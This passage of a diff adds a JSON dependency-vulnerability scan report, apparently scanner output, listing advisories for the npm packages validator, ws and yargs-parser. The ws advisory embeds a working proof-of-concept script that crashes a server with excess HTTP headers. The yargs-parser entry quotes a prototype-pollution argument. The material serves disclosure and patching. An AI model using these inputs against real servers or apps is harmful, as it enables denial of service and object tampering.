+                  "url": "https://github.com/validatorjs/validator.js"
+                },
+                {
+                  "type": "WEB",
+                  "url": "http://validatorjs.com"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-79"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-10-13T20:08:58Z",
+                "nvd_published_at": "2025-09-30T18:15:50Z",
+                "severity": "MODERATE"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-9965-vmph-33xx"
+              ],
+              "aliases": [
+                "CVE-2025-56200",
+                "GHSA-9965-vmph-33xx"
+              ],
+              "max_severity": "6.1"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "ws",
+            "version": "8.6.0",
+            "ecosystem": "npm"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2024-07-15T22:12:28Z",
+              "published": "2024-06-17T19:09:10Z",
+              "schema_version": "1.7.3",
+              "id": "GHSA-3h5v-q93c-6h6q",
+              "aliases": [
+                "CVE-2024-37890"
+              ],
+              "related": [
+                "CGA-4mjj-vhp5-59v2",
+                "CGA-5jj7-2gq6-8p9g",
+                "CGA-6rmc-53qg-r2v4",
+                "CGA-cm39-xg6p-r3wr",
+                "CGA-h8rj-78mh-45v7",
+                "CGA-hf88-h9xp-mq5f",
+                "CGA-qv4g-5p29-rxvx",
+                "CGA-r6qh-9mxv-rrj2",
+                "CVE-2024-37890"
+              ],
+              "summary": "ws affected by a DoS when handling a request with many HTTP headers",
+              "details": "### Impact\n\nA request with a number of headers exceeding the[`server.maxHeadersCount`][] threshold could be used to crash a ws server.\n\n### Proof of concept\n\n```js\nconst http = require('http');\nconst WebSocket = require('ws');\n\nconst wss = new WebSocket.Server({ port: 0 }, function () {\n  const chars = \"!#$%\u0026'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~\".split('');\n  const headers = {};\n  let count = 0;\n\n  for (let i = 0; i \u003c chars.length; i++) {\n    if (count === 2000) break;\n\n    for (let j = 0; j \u003c chars.length; j++) {\n      const key = chars[i] + chars[j];\n      headers[key] = 'x';\n\n      if (++count === 2000) break;\n    }\n  }\n\n  headers.Connection = 'Upgrade';\n  headers.Upgrade = 'websocket';\n  headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';\n  headers['Sec-WebSocket-Version'] = '13';\n\n  const request = http.request({\n    headers: headers,\n    host: '127.0.0.1',\n    port: wss.address().port\n  });\n\n  request.end();\n});\n```\n\n### Patches\n\nThe vulnerability was fixed in ws@8.17.1 (https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c) and backported to ws@7.5.10 (https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f), ws@6.2.3 (https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63), and ws@5.2.4 (https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e)\n\n### Workarounds\n\nIn vulnerable versions of ws, the issue can be mitigated in the following ways:\n\n1. Reduce the maximum allowed length of the request headers using the [`--max-http-header-size=size`][] and/or the [`maxHeaderSize`][] options so that no more headers than the `server.maxHeadersCount` limit can be sent.\n2. Set `server.maxHeadersCount` to `0` so that no limit is applied.\n\n### Credits\n\nThe vulnerability was reported by [Ryan LaPointe](https://github.com/rrlapointe) in https://github.com/websockets/ws/issues/2230.\n\n### References\n\n- https://github.com/websockets/ws/issues/2230\n- https://github.com/websockets/ws/pull/2231\n\n[`--max-http-header-size=size`]: https://nodejs.org/api/cli.html#--max-http-header-sizesize\n[`maxHeaderSize`]: https://nodejs.org/api/http.html#httpcreateserveroptions-requestlistener\n[`server.maxHeadersCount`]: https://nodejs.org/api/http.html#servermaxheaderscount\n",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+                },
+                {
+                  "type": "CVSS_V4",
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
+                }
+              ],
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "ws",
+                    "purl": "pkg:npm/ws"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "2.1.0"
+                        },
+                        {
+                          "fixed": "5.2.4"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-3h5v-q93c-6h6q/GHSA-3h5v-q93c-6h6q.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "ws",
+                    "purl": "pkg:npm/ws"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "6.0.0"
+                        },
+                        {
+                          "fixed": "6.2.3"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-3h5v-q93c-6h6q/GHSA-3h5v-q93c-6h6q.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "ws",
+                    "purl": "pkg:npm/ws"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "7.0.0"
+                        },
+                        {
+                          "fixed": "7.5.10"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-3h5v-q93c-6h6q/GHSA-3h5v-q93c-6h6q.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "ws",
+                    "purl": "pkg:npm/ws"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "8.0.0"
+                        },
+                        {
+                          "fixed": "8.17.1"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-3h5v-q93c-6h6q/GHSA-3h5v-q93c-6h6q.json"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/websockets/ws/security/advisories/GHSA-3h5v-q93c-6h6q"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/websockets/ws/issues/2230"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/websockets/ws/pull/2231"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/websockets/ws"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-476"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2024-06-17T19:09:10Z",
+                "nvd_published_at": null,
+                "severity": "HIGH"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-3h5v-q93c-6h6q"
+              ],
+              "aliases": [
+                "CVE-2024-37890",
+                "GHSA-3h5v-q93c-6h6q"
+              ],
+              "max_severity": "8.7"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "yargs-parser",
+            "version": "10.1.0",
+            "ecosystem": "npm"
+          },
+          "dependency_groups": [
+            "dev"
+          ],
+          "vulnerabilities": [
+            {
+              "modified": "2025-01-14T08:57:10Z",
+              "published": "2020-09-04T18:00:54Z",
+              "schema_version": "1.7.3",
+              "id": "GHSA-p9pc-299p-vxgp",
+              "aliases": [
+                "CVE-2020-7608"
+              ],
+              "summary": "yargs-parser Vulnerable to Prototype Pollution",
+              "details": "Affected versions of `yargs-parser` are vulnerable to prototype pollution. Arguments are not properly sanitized, allowing an attacker to modify the prototype of `Object`, causing the addition or modification of an existing property that will exist on all objects.  \nParsing the argument `--foo.__proto__.bar baz'` adds a `bar` property with value `baz` to all objects. This is only exploitable if attackers have control over the arguments being passed to `yargs-parser`.\n\n\n\n## Recommendation\n\nUpgrade to versions 13.1.2, 15.0.1, 18.1.1 or later.",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L"
+                }
+              ],
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "yargs-parser",
+                    "purl": "pkg:npm/yargs-parser"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "6.0.0"
+                        },
+                        {
+                          "fixed": "13.1.2"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2020/09/GHSA-p9pc-299p-vxgp/GHSA-p9pc-299p-vxgp.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "yargs-parser",
+                    "purl": "pkg:npm/yargs-parser"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "14.0.0"
+                        },
+                        {
+                          "fixed": "15.0.1"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2020/09/GHSA-p9pc-299p-vxgp/GHSA-p9pc-299p-vxgp.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "yargs-parser",
+                    "purl": "pkg:npm/yargs-parser"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "16.0.0"
+                        },
+                        {
+                          "fixed": "18.1.1"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2020/09/GHSA-p9pc-299p-vxgp/GHSA-p9pc-299p-vxgp.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "yargs-parser",
+                    "purl": "pkg:npm/yargs-parser"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "5.0.1"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 5.0.0",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2020/09/GHSA-p9pc-299p-vxgp/GHSA-p9pc-299p-vxgp.json"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-7608"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/yargs/yargs-parser/commit/1c417bd0b42b09c475ee881e36d292af4fa2cc36"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/yargs/yargs-parser/commit/63810ca1ae1a24b08293a4d971e70e058c7a41e2"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/yargs/yargs-parser"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://snyk.io/vuln/SNYK-JS-YARGSPARSER-560381"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://www.npmjs.com/advisories/1500"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-1321",
+                  "CWE-915"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2020-08-31T19:01:32Z",
+                "nvd_published_at": "2020-03-16T20:15:00Z",
+                "severity": "MODERATE"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-p9pc-299p-vxgp"
+              ],
+              "aliases": [
+                "CVE-2020-7608",
+                "GHSA-p9pc-299p-vxgp"
+              ],
+              "max_severity": "5.3"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "experimental_config": {
+    "licenses": {
+      "summary": false,
+      "allowlist": null
+    }
+  }
+}
